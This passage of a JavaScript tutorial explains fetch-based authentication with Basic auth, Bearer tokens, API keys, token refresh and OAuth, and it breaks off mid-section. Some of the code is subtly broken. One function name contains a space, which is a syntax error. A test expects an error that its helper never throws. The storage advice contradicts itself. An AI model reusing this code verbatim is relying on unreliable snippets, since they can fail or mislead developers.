fetch('https://api.example.com/resource', {
  method: 'PUT',
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'value' })
})
.then(response => {
  // The browser handles OPTIONS request automatically
  return response.json();
});
```

#### Dynamic Credential Updates

```javascript
class DynamicAuthFetch {
  constructor() {
    this.authToken = null;
  }
  
  updateCredentials(username, password) {
    this.authToken = btoa(`${username}:${password}`);
  }
  
  async fetch(url, options = {}) {
    if (!this.authToken) {
      throw new Error('No credentials set');
    }
    
    const authOptions = {
      ...options,
      headers: {
        'Authorization': `Basic ${this.authToken}`,
        ...options.headers
      }
    };
    
    const response = await fetch(url, authOptions);
    
    if (response.status === 401) {
      this.authToken = null;
      throw new Error('Authentication expired');
    }
    
    return response;
  }
}

const authFetch = new DynamicAuthFetch();
authFetch.updateCredentials('user', 'password');
authFetch.fetch('https://api.example.com/data');
```

### Base64 Encoding Considerations

#### Handling Special Characters

```javascript
function encodeCredentials(username, password) {
  // btoa only works with ASCII characters
  const credentials = `${username}:${password}`;
  
  try {
    return btoa(credentials);
  } catch (error) {
    // For non-ASCII characters, use this approach
    return btoa(unescape(encodeURIComponent(credentials)));
  }
}

const auth = encodeCredentials('user@domain', 'pǎss123');
```

#### URL-Safe Encoding

```javascript
function urlSafeBase64(username, password) {
  const credentials = btoa(`${username}:${password}`);
  // Replace characters that may cause issues in URLs
  return credentials
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}
```

### Request Interceptors Pattern

```javascript
class FetchInterceptor {
  constructor(baseURL, username, password) {
    this.baseURL = baseURL;
    this.auth = btoa(`${username}:${password}`);
  }
  
  async request(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    
    const config = {
      ...options,
      headers: {
        'Authorization': `Basic ${this.auth}`,
        'Content-Type': 'application/json',
        ...options.headers
      }
    };
    
    const response = await fetch(url, config);
    
    if (!response.ok) {
      throw new Error(`Request failed: ${response.status}`);
    }
    
    return response.json();
  }
  
  get(endpoint) {
    return this.request(endpoint, { method: 'GET' });
  }
  
  post(endpoint, data) {
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
}

const api = new FetchInterceptor('https://api.example.com', 'user', 'pass');
api.get('/users');
api.post('/users', { name: 'John' });
```

### Testing Authentication

#### Mock Fetch for Testing

```javascript
// Test helper
function mockFetch(expectedAuth, responseData) {
  return function(url, options) {
    const authHeader = options.headers?.Authorization;
    
    if (authHeader === `Basic ${expectedAuth}`) {
      return Promise.resolve({
        ok: true,
        status: 200,
        json: () => Promise.resolve(responseData)
      });
    }
    
    return Promise.resolve({
      ok: false,
      status: 401,
      json: () => Promise.resolve({ error: 'Unauthorized' })
    });
  };
}

// Usage in tests
const originalFetch = global.fetch;
global.fetch = mockFetch(btoa('user:pass'), { data: 'success' });

// Run your tests
fetchWithBasicAuth('https://api.example.com', 'user', 'pass')
  .then(data => console.log('Test passed:', data));

global.fetch = originalFetch;
```

### Security Considerations

#### Avoiding Credential Exposure

```javascript
// Never log credentials
function secureFetch(url, username, password) {
  const auth = btoa(`${username}:${password}`);
  
  // DO NOT log the auth header
  console.log('Making request to:', url);
  
  return fetch(url, {
    headers: {
      'Authorization': `Basic ${auth}`
    }
  });
}
```

#### HTTPS Enforcement

```javascript
function secureFetch(url, credentials) {
  if (!url.startsWith('https://')) {
    throw new Error('Basic Auth requires HTTPS');
  }
  
  return fetch(url, {
    headers: {
      'Authorization': `Basic ${credentials}`
    }
  });
}
```

### Response Body Handling

#### Handling Different Content Types

```javascript
async function fetchWithAuth(url, auth) {
  const response = await fetch(url, {
    headers: {
      'Authorization': `Basic ${auth}`
    }
  });
  
  const contentType = response.headers.get('content-type');
  
  if (contentType?.includes('application/json')) {
    return response.json();
  }
  
  if (contentType?.includes('text/')) {
    return response.text();
  }
  
  return response.blob();
}
```

#### Stream Handling

```javascript
async function streamWithAuth(url, auth) {
  const response = await fetch(url, {
    headers: {
      'Authorization': `Basic ${auth}`
    }
  });
  
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    
    const chunk = decoder.decode(value);
    console.log('Received chunk:', chunk);
  }
}
```

---

## Bearer Tokens

### Authentication Header Structure

Bearer tokens are transmitted via the `Authorization` header using the format `Bearer <token>`. The fetch API implements this through the `headers` option:

```javascript
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
  }
})
```

### Header Configuration Methods

#### Object Literal Syntax

```javascript
const response = await fetch(url, {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
});
```

#### Headers Constructor

```javascript
const headers = new Headers();
headers.append('Authorization', `Bearer ${token}`);
headers.append('Content-Type', 'application/json');

const response = await fetch(url, { headers });
```

#### Headers Instances with Set Method

```javascript
const headers = new Headers();
headers.set('Authorization', `Bearer ${token}`);
// set() replaces existing values, append() adds multiple values
```

### Token Management Patterns

#### Environment Variables

```javascript
const token = process.env.API_TOKEN;
// or in browser context
const token = import.meta.env.VITE_API_TOKEN;

fetch(url, {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

#### Secure Storage in Browser

```javascript
// SessionStorage (cleared on tab close)
sessionStorage.setItem('authToken', token);
const storedToken = sessionStorage.getItem('authToken');

// LocalStorage (persists across sessions)
localStorage.setItem('authToken', token);
const persistentToken = localStorage.getItem('authToken');
```

#### Token Retrieval Functions

```javascript
async function getAuthToken() {
  const token = sessionStorage.getItem('authToken');
  if (!token) {
    throw new Error('No authentication token found');
  }
  return token;
}

async function authenticatedFetch(url, options = {}) {
  const token = await getAuthToken();
  
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
}
```

### Token Refresh Mechanisms

#### Automatic Token Renewal

```javascript
let accessToken = 'current_token';
let refreshToken = 'refresh_token';

async function fetchWithTokenRefresh(url, options = {}) {
  try {
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${accessToken}`
      }
    });

    if (response.status === 401) {
      // Token expired, attempt refresh
      const newToken = await refreshAccessToken();
      accessToken = newToken;
      
      // Retry original request with new token
      return fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${accessToken}`
        }
      });
    }

    return response;
  } catch (error) {
    throw error;
  }
}

async function refreshAccessToken() {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${refreshToken}`
    }
  });

  if (!response.ok) {
    throw new Error('Token refresh failed');
  }

  const data = await response.json();
  return data.accessToken;
}
```

#### Interceptor Pattern

```javascript
class AuthenticatedFetch {
  constructor(baseURL, tokenProvider) {
    this.baseURL = baseURL;
    this.tokenProvider = tokenProvider;
  }

  async request(endpoint, options = {}) {
    const token = await this.tokenProvider();
    const url = `${this.baseURL}${endpoint}`;

    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });

    if (response.status === 401) {
      // Handle token expiration
      await this.handleTokenExpiration();
      // Retry logic here
    }

    return response;
  }

  async handleTokenExpiration() {
    // Refresh token logic
  }
}

const api = new AuthenticatedFetch(
  'https://api.example.com',
  () => sessionStorage.getItem('authToken')
);
```

### CORS and Preflight Requests

#### Preflight Behavior with Authorization Headers

Custom headers like `Authorization` trigger CORS preflight (OPTIONS request). The server must respond with appropriate CORS headers:

```javascript
// Browser automatically sends OPTIONS request first
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer token123',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'value' })
});

// Server must respond to OPTIONS with:
// Access-Control-Allow-Origin: https://yourdomain.com
// Access-Control-Allow-Headers: Authorization, Content-Type
// Access-Control-Allow-Methods: POST, GET, OPTIONS
```

#### Credentials Mode

```javascript
fetch(url, {
  method: 'GET',
  credentials: 'include', // Sends cookies with request
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// credentials options:
// 'omit' - never send cookies
// 'same-origin' - send cookies only for same-origin requests (default)
// 'include' - always send cookies, even cross-origin
```

### Error Handling Specific to Bearer Tokens

#### Status Code Handling

```javascript
async function fetchWithAuth(url, token) {
  const response = await fetch(url, {
    headers: { 'Authorization': `Bearer ${token}` }
  });

  switch (response.status) {
    case 401:
      throw new Error('Unauthorized: Invalid or expired token');
    case 403:
      throw new Error('Forbidden: Insufficient permissions');
    case 404:
      throw new Error('Resource not found');
    case 500:
      throw new Error('Server error');
    default:
      if (!response.ok) {
        throw new Error(`HTTP error: ${response.status}`);
      }
  }

  return response.json();
}
```

#### Comprehensive Error Handler

```javascript
async function authenticatedRequest(url, options = {}) {
  try {
    const token = getToken();
    
    if (!token) {
      throw new Error('No authentication token available');
    }

    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });

    if (response.status === 401) {
      // Clear invalid token
      clearToken();
      redirectToLogin();
      throw new Error('Session expired');
    }

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `Request failed: ${response.status}`);
    }

    return await response.json();

  } catch (error) {
    if (error.name === 'TypeError') {
      // Network error
      throw new Error('Network error: Unable to reach server');
    }
    throw error;
  }
}
```

### Token Security Considerations

#### Token Exposure Prevention

```javascript
// DON'T: Log tokens
console.log('Token:', token); // SECURITY RISK

// DON'T: Include in URLs
fetch(`https://api.example.com/data?token=${token}`); // SECURITY RISK

// DO: Use headers only
fetch(url, {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

#### Token Validation Before Sending

```javascript
function isTokenValid(token) {
  if (!token || typeof token !== 'string') return false;
  
  // JWT structure check (header.payload.signature)
  const parts = token.split('.');
  if (parts.length !== 3) return false;
  
  try {
    // Decode payload (base64url)
    const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
    
    // Check expiration
    if (payload.exp && payload.exp * 1000 < Date.now()) {
      return false;
    }
    
    return true;
  } catch {
    return false;
  }
}

async function safeFetch(url, token, options = {}) {
  if (!isTokenValid(token)) {
    throw new Error('Invalid token');
  }

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
}
```

#### XSS Protection

```javascript
// Avoid storing tokens in easily accessible locations
// [Inference] XSS attacks can extract tokens from localStorage

// More secure: Use httpOnly cookies (set by server)
// Token not accessible to JavaScript, reducing XSS risk
// [Inference] This pattern requires server-side session management

// Or use short-lived tokens with refresh mechanism
const TOKEN_EXPIRY = 15 * 60 * 1000; // 15 minutes
```

### Advanced Patterns

#### Request Queuing During Token Refresh

```javascript
class TokenManager {
  constructor() {
    this.token = null;
    this.refreshPromise = null;
  }

  async getToken() {
    if (this.token && !this.isExpired(this.token)) {
      return this.token;
    }

    // If refresh is already in progress, wait for it
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    // Start new refresh
    this.refreshPromise = this.refreshToken()
      .then(newToken => {
        this.token = newToken;
        this.refreshPromise = null;
        return newToken;
      })
      .catch(error => {
        this.refreshPromise = null;
        throw error;
      });

    return this.refreshPromise;
  }

  async refreshToken() {
    // Refresh logic
    const response = await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include'
    });
    
    const data = await response.json();
    return data.accessToken;
  }

  isExpired(token) {
    try {
      const payload = JSON.parse(atob(token.split('.')[1]));
      return payload.exp * 1000 < Date.now();
    } catch {
      return true;
    }
  }
}

const tokenManager = new TokenManager();

async function fetch WithAuth(url, options = {}) {
  const token = await tokenManager.getToken();
  
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
}
```

#### Retry Logic with Exponential Backoff

```javascript
async function fetchWithRetry(url, token, maxRetries = 3) {
  let lastError;

  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, {
        headers: { 'Authorization': `Bearer ${token}` }
      });

      if (response.status === 401) {
        // Don't retry auth failures
        throw new Error('Authentication failed');
      }

      if (response.ok) {
        return response;
      }

      if (response.status >= 500) {
        // Server error, retry
        const delay = Math.pow(2, i) * 1000; // Exponential backoff
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      }

      // Client error, don't retry
      throw new Error(`HTTP ${response.status}`);

    } catch (error) {
      lastError = error;
      if (i === maxRetries - 1) break;
      
      const delay = Math.pow(2, i) * 1000;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }

  throw lastError;
}
```

#### Multiple Token Types

```javascript
async function fetchWithMultipleTokens(url, accessToken, apiKey) {
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${accessToken}`,
      'X-API-Key': apiKey,
      'Content-Type': 'application/json'
    }
  });
}

// OAuth 2.0 token types
async function fetchWithOAuth(url, token, tokenType = 'Bearer') {
  return fetch(url, {
    headers: {
      'Authorization': `${tokenType} ${token}`
      // tokenType could be: Bearer, MAC, etc.
    }
  });
}
```

### Testing Bearer Token Authentication

#### Mock Fetch for Testing

```javascript
// Mock authenticated fetch
global.fetch = jest.fn((url, options) => {
  const authHeader = options?.headers?.Authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return Promise.resolve({
      ok: false,
      status: 401,
      json: () => Promise.resolve({ error: 'Unauthorized' })
    });
  }

  const token = authHeader.replace('Bearer ', '');
  
  if (token === 'valid_token') {
    return Promise.resolve({
      ok: true,
      status: 200,
      json: () => Promise.resolve({ data: 'success' })
    });
  }

  return Promise.resolve({
    ok: false,
    status: 401,
    json: () => Promise.resolve({ error: 'Invalid token' })
  });
});
```

#### Integration Test Example

```javascript
describe('Authenticated API calls', () => {
  test('includes bearer token in request', async () => {
    const mockFetch = jest.spyOn(global, 'fetch');
    const token = 'test_token_123';

    await authenticatedFetch('https://api.example.com/data', token);

    expect(mockFetch).toHaveBeenCalledWith(
      'https://api.example.com/data',
      expect.objectContaining({
        headers: expect.objectContaining({
          'Authorization': 'Bearer test_token_123'
        })
      })
    );
  });

  test('handles 401 response', async () => {
    global.fetch = jest.fn().mockResolvedValue({
      ok: false,
      status: 401
    });

    await expect(
      authenticatedFetch('https://api.example.com/data', 'invalid_token')
    ).rejects.toThrow('Unauthorized');
  });
});
```

### Performance Optimization

#### Token Caching

```javascript
class CachedTokenProvider {
  constructor(tokenFetcher, cacheDuration = 3600000) {
    this.tokenFetcher = tokenFetcher;
    this.cacheDuration = cacheDuration;
    this.cachedToken = null;
    this.cacheTimestamp = null;
  }

  async getToken() {
    const now = Date.now();
    
    if (
      this.cachedToken &&
      this.cacheTimestamp &&
      (now - this.cacheTimestamp) < this.cacheDuration
    ) {
      return this.cachedToken;
    }

    this.cachedToken = await this.tokenFetcher();
    this.cacheTimestamp = now;
    
    return this.cachedToken;
  }

  invalidate() {
    this.cachedToken = null;
    this.cacheTimestamp = null;
  }
}

const tokenProvider = new CachedTokenProvider(
  () => fetch('/api/token').then(r => r.json()).then(d => d.token)
);
```

#### Request Deduplication

```javascript
class RequestDeduplicator {
  constructor() {
    this.pendingRequests = new Map();
  }

  async fetch(url, options = {}) {
    const key = `${options.method || 'GET'}:${url}`;
    
    if (this.pendingRequests.has(key)) {
      // Return existing promise for identical request
      return this.pendingRequests.get(key);
    }

    const promise = fetch(url, options)
      .finally(() => {
        this.pendingRequests.delete(key);
      });

    this.pendingRequests.set(key, promise);
    return promise;
  }
}

const deduplicator = new RequestDeduplicator();

// Multiple identical calls will only result in one network request
Promise.all([
  deduplicator.fetch(url, { headers: { 'Authorization': `Bearer ${token}` }}),
  deduplicator.fetch(url, { headers: { 'Authorization': `Bearer ${token}` }}),
  deduplicator.fetch(url, { headers: { 'Authorization': `Bearer ${token}` }})
]);
```

---

## API Keys

### Sending API Keys in Headers

API keys are typically sent via the `Authorization` header or custom headers specified by the API provider.

```javascript
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': 'Bearer YOUR_API_KEY_HERE',
    'Content-Type': 'application/json'
  }
})
```

#### Common Header Patterns

Different APIs use different header conventions:

```javascript
// Bearer token (OAuth 2.0, JWT)
headers: {
  'Authorization': 'Bearer sk-1234567890abcdef'
}

// API key in custom header
headers: {
  'X-API-Key': 'your-api-key',
  'Api-Key': 'your-api-key'
}

// Basic Authentication
headers: {
  'Authorization': 'Basic ' + btoa('username:password')
}

// Token prefix variations
headers: {
  'Authorization': 'Token your-api-key',
  'Authorization': 'ApiKey your-api-key'
}
```

### Query Parameter Authentication

Some APIs accept keys as URL parameters (less secure, avoid for sensitive operations):

```javascript
const apiKey = 'your-api-key';
const url = `https://api.example.com/data?api_key=${apiKey}`;

fetch(url)
  .then(response => response.json())
  .then(data => console.log(data));
```

### Environment Variables for API Keys

Never hardcode API keys. Use environment variables:

```javascript
// In Node.js
const API_KEY = process.env.API_KEY;

fetch('https://api.example.com/data', {
  headers: {
    'Authorization': `Bearer ${API_KEY}`
  }
})

// In browser with build tools (Vite, webpack)
const API_KEY = import.meta.env.VITE_API_KEY; // Vite
const API_KEY = process.env.REACT_APP_API_KEY; // Create React App

fetch('https://api.example.com/data', {
  headers: {
    'Authorization': `Bearer ${API_KEY}`
  }
})
```

### OAuth 2.0 Flow with Fetch

#### Authorization Code Flow

```javascript
// Step 1: Redirect user to authorization URL
const authUrl = `https://oauth-provider.com/authorize?` +
  `client_id=${CLIENT_ID}&` +
  `redirect_uri=${REDIRECT_URI}&` +
  `response_type=code&` +
  `scope=read write`;

window.location.href = authUrl;

// Step 2: Exchange authorization code for access token
async function exchangeCodeForToken(code) {
  const response = await fetch('https://oauth-provider.com/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      redirect_uri: REDIRECT_URI
    })
  });

  const data = await response.json();
  return data.access_token;
}

// Step 3: Use access token
async function fetchProtectedResource(accessToken) {
  const response = await fetch('https://api.example.com/protected', {
    headers: {
      'Authorization': `Bearer ${accessToken}`
    }
  });
  
  return response.json();
}
```

#### Client Credentials Flow

```javascript
async function getClientCredentialsToken() {
  const response = await fetch('https://oauth-provider.com/token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': 'Basic ' + btoa(`${CLIENT_ID}:${CLIENT_SECRET}`)
    },
    body: new URLSearchParams({
      grant_type: 'client_credentials',
      scope: 'api.read api.write'
    })
  });

  const data = await response.json();
  return data.access_token;
}
```

### Token Refresh Pattern

```javascript
class AuthenticatedFetch {
  constructor(baseUrl, clientId, clientSecret) {
    this.baseUrl = baseUrl;
    this.clientId = clientId;
    this.clientSecret = clientSecret;
    this.accessToken = null;
    this.refreshToken = null;
    this.tokenExpiry = null;
  }

  async refreshAccessToken() {
    const response = await fetch('https://oauth-provider.com/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: this.refreshToken,
        client_id: this.clientId,
        client_secret: this.clientSecret
      })
    });

    const data = await response.json();
    this.accessToken = data.access_token;
    this.refreshToken = data.refresh_token || this.refreshToken;
    this.tokenExpiry = Date.now() + (data.expires_in * 1000);
    
    return this.accessToken;
  }

  async fetch(endpoint, options = {}) {
    // Check if token needs refresh
    if (!this.accessToken || Date.now() >= this.tokenExpiry - 60000) {
      await this.refreshAccessToken();
    }

    const response = await fetch(`${this.baseUrl}${endpoint}`, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.accessToken}`
      }
    });

    // Handle 401 by refreshing token and retrying once
    if (response.status === 401) {
      await this.refreshAccessToken();
      return fetch(`${this.baseUrl}${endpoint}`, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${this.accessToken}`
        }
      });
    }

    return response;
  }
}

// Usage
const api = new AuthenticatedFetch(
  'https://api.example.com',
  'client-id',
  'client-secret'
);

const data = await api.fetch('/users').then(r => r.json());
```

### JWT (JSON Web Token) Authentication

```javascript
// Decoding JWT (client-side inspection only, NOT validation)
function parseJwt(token) {
  const base64Url = token.split('.')[1];
  const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  const jsonPayload = decodeURIComponent(
    atob(base64).split('').map(c => {
      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join('')
  );
  return JSON.parse(jsonPayload);
}

// Check token expiry before making request
function isTokenExpired(token) {
  const decoded = parseJwt(token);
  return decoded.exp * 1000 < Date.now();
}

// Fetch with JWT
async function fetchWithJWT(url, token) {
  if (isTokenExpired(token)) {
    token = await refreshJWT();
  }

  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
}
```

### API Key Rotation Strategy

```javascript
class APIKeyManager {
  constructor(primaryKey, secondaryKey = null) {
    this.primaryKey = primaryKey;
    this.secondaryKey = secondaryKey;
    this.usePrimary = true;
  }

  getCurrentKey() {
    return this.usePrimary ? this.primaryKey : this.secondaryKey;
  }

  async fetchWithFallback(url, options = {}) {
    const attemptFetch = async (apiKey) => {
      return fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${apiKey}`
        }
      });
    };

    let response = await attemptFetch(this.getCurrentKey());

    // If primary fails with 401/403 and secondary exists, try secondary
    if ((response.status === 401 || response.status === 403) && this.secondaryKey) {
      this.usePrimary = !this.usePrimary;
      response = await attemptFetch(this.getCurrentKey());
    }

    return response;
  }

  rotateKeys(newPrimaryKey) {
    this.secondaryKey = this.primaryKey;
    this.primaryKey = newPrimaryKey;
    this.usePrimary = true;
  }
}
```

### Rate Limiting with Authentication

```javascript
class RateLimitedFetch {
  constructor(apiKey, requestsPerSecond = 10) {
    this.apiKey = apiKey;
    this.minInterval = 1000 / requestsPerSecond;
    this.lastRequest = 0;
    this.queue = [];
    this.processing = false;
  }

  async fetch(url, options = {}) {
    return new Promise((resolve, reject) => {
      this.queue.push({ url, options, resolve, reject });
      this.processQueue();
    });
  }

  async processQueue() {
    if (this.processing || this.queue.length === 0) return;
    
    this.processing = true;

    while (this.queue.length > 0) {
      const now = Date.now();
      const timeSinceLastRequest = now - this.lastRequest;

      if (timeSinceLastRequest < this.minInterval) {
        await new Promise(resolve => 
          setTimeout(resolve, this.minInterval - timeSinceLastRequest)
        );
      }

      const { url, options, resolve, reject } = this.queue.shift();
      this.lastRequest = Date.now();

      try {
        const response = await fetch(url, {
          ...options,
          headers: {
            ...options.headers,
            'Authorization': `Bearer ${this.apiKey}`
          }
        });
        resolve(response);
      } catch (error) {
        reject(error);
      }
    }

    this.processing = false;
  }
}

// Usage
const api = new RateLimitedFetch('your-api-key', 5); // 5 requests per second
const response = await api.fetch('https://api.example.com/data');
```

### Handling Authentication Errors

```javascript
async function fetchWithAuth(url, apiKey) {
  const response = await fetch(url, {
    headers: {
      'Authorization': `Bearer ${apiKey}`
    }
  });

  switch (response.status) {
    case 401:
      throw new Error('Unauthorized: Invalid or expired API key');
    
    case 403:
      throw new Error('Forbidden: Insufficient permissions');
    
    case 429:
      const retryAfter = response.headers.get('Retry-After');
      throw new Error(`Rate limited. Retry after ${retryAfter} seconds`);
    
    case 200:
    case 201:
      return response.json();
    
    default:
      throw new Error(`Request failed with status ${response.status}`);
  }
}

// With retry logic
async function fetchWithRetry(url, apiKey, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fetchWithAuth(url, apiKey);
    } catch (error) {
      if (error.message.includes('Rate limited') && i < maxRetries - 1) {
        const match = error.message.match(/\d+/);
        const waitTime = match ? parseInt(match[0]) * 1000 : 1000 * (i + 1);
        await new Promise(resolve => setTimeout(resolve, waitTime));
        continue;
      }
      throw error;
    }
  }
}
```

### Secure Storage of Tokens

```javascript
// Browser: Use sessionStorage or memory (never localStorage for sensitive tokens)
class TokenStorage {
  constructor() {
    this.token = null; // In-memory storage
  }

  setToken(token) {
    this.token = token;
    // Or for session persistence:
    // sessionStorage.setItem('auth_token', token);
  }

  getToken() {
    return this.token;
    // Or: return sessionStorage.getItem('auth_token');
  }

  clearToken() {
    this.token = null;
    // sessionStorage.removeItem('auth_token');
  }
}

// For sensitive applications, implement token encryption
async function encryptToken(token, password) {
  const enc = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    'raw',
    enc.encode(password),
    { name: 'PBKDF2' },
    false,
    ['deriveBits', 'deriveKey']
  );

  const key = await crypto.subtle.deriveKey(
    {
      name: 'PBKDF2',
      salt: enc.encode('salt-value'),
      iterations: 100000,
      hash: 'SHA-256'
    },
    keyMaterial,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );

  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    enc.encode(token)
  );

  return { encrypted, iv };
}
```

### Multi-Service Authentication Handler

```javascript
class MultiServiceAuth {
  constructor() {
    this.services = new Map();
  }

  addService(name, config) {
    this.services.set(name, {
      apiKey: config.apiKey,
      baseUrl: config.baseUrl,
      authType: config.authType || 'bearer',
      headerName: config.headerName || 'Authorization'
    });
  }

  async fetch(serviceName, endpoint, options = {}) {
    const service = this.services.get(serviceName);
    if (!service) {
      throw new Error(`Service ${serviceName} not configured`);
    }

    const authHeader = this.buildAuthHeader(service);
    
    return fetch(`${service.baseUrl}${endpoint}`, {
      ...options,
      headers: {
        ...options.headers,
        [service.headerName]: authHeader
      }
    });
  }

  buildAuthHeader(service) {
    switch (service.authType) {
      case 'bearer':
        return `Bearer ${service.apiKey}`;
      case 'basic':
        return `Basic ${btoa(service.apiKey)}`;
      case 'token':
        return `Token ${service.apiKey}`;
      case 'apikey':
        return service.apiKey;
      default:
        return service.apiKey;
    }
  }
}

// Usage
const auth = new MultiServiceAuth();

auth.addService('github', {
  apiKey: 'ghp_xxxxx',
  baseUrl: 'https://api.github.com',
  authType: 'bearer'
});

auth.addService('stripe', {
  apiKey: 'sk_test_xxxxx',
  baseUrl: 'https://api.stripe.com',
  authType: 'bearer'
});

// Make authenticated requests
const repos = await auth.fetch('github', '/user/repos').then(r => r.json());
const customers = await auth.fetch('stripe', '/v1/customers').then(r => r.json());
```

### CORS and Preflight Requests with Authentication

```javascript
// Custom headers trigger preflight requests
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer your-token', // Triggers preflight
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify({ data: 'value' })
})

// Server must respond to OPTIONS request with:
// Access-Control-Allow-Origin: https://your-domain.com
// Access-Control-Allow-Methods: POST, GET, OPTIONS
// Access-Control-Allow-Headers: Authorization, Content-Type, X-Custom-Header
// Access-Control-Allow-Credentials: true (if using cookies)
```

### Proxy Pattern for API Key Protection

```javascript
// Frontend: Never expose API keys
async function fetchThroughProxy(endpoint, options = {}) {
  // Call your backend proxy instead of external API directly
  return fetch(`/api/proxy${endpoint}`, {
    ...options,
    credentials: 'include' // Include session cookies
  });
}

// Backend proxy (Node.js/Express example concept)
// app.post('/api/proxy/*', authenticate, async (req, res) => {
//   const externalUrl = `https://external-api.com${req.params[0]}`;
//   const response = await fetch(externalUrl, {
//     method: req.method,
//     headers: {
//       'Authorization': `Bearer ${process.env.API_KEY}`,
//       'Content-Type': 'application/json'
//     },
//     body: JSON.stringify(req.body)
//   });
//   const data = await response.json();
//   res.json(data);
// });
```

### API Key Security Best Practices

```javascript
// ❌ NEVER DO THIS
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': 'Bearer sk-1234567890' // Hardcoded key
  }
})

// ❌ NEVER expose keys in client-side code
const API_KEY = 'sk-1234567890';

// ❌ NEVER commit keys to version control
// Check .gitignore includes .env files

// ✅ DO THIS
// Use environment variables
const API_KEY = process.env.API_KEY;

// ✅ Use backend proxy for sensitive keys
// ✅ Rotate keys regularly
// ✅ Use different keys for dev/staging/production
// ✅ Implement key expiration and refresh
// ✅ Monitor API usage for anomalies
// ✅ Use minimal scopes/permissions
// ✅ Store tokens in memory or secure session storage, not localStorage
```

### Authentication State Management

```javascript
class AuthManager {
  constructor() {
    this.token = null;
    this.user = null;
    this.listeners = [];
  }

  async login(credentials) {
    const response = await fetch('https://api.example.com/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials)
    });

    const data = await response.json();
    this.token = data.token;
    this.user = data.user;
    this.notifyListeners({ type: 'login', user: this.user });
    
    return data;
  }

  async logout() {
    await fetch('https://api.example.com/logout', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${this.token}` }
    });

    this.token = null;
    this.user = null;
    this.notifyListeners({ type: 'logout' });
  }

  async authenticatedFetch(url, options = {}) {
    if (!this.token) {
      throw new Error('Not authenticated');
    }

    return fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.token}`
      }
    });
  }

  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }

  notifyListeners(event) {
    this.listeners.forEach(listener => listener(event));
  }

  isAuthenticated() {
    return !!this.token;
  }
}

// Usage
const auth = new AuthManager();

auth.subscribe(event => {
  if (event.type === 'logout') {
    window.location.href = '/login';
  }
});

await auth.login({ username: 'user', password: 'pass' });
const data = await auth.authenticatedFetch('/api/protected').then(r => r.json());
```

---

## OAuth 2.0 Flows

### Authorization Code Flow

The authorization code flow is the most secure OAuth 2.0 flow for server-side applications. The process involves exchanging an authorization code for tokens.

#### Initial Authorization Request

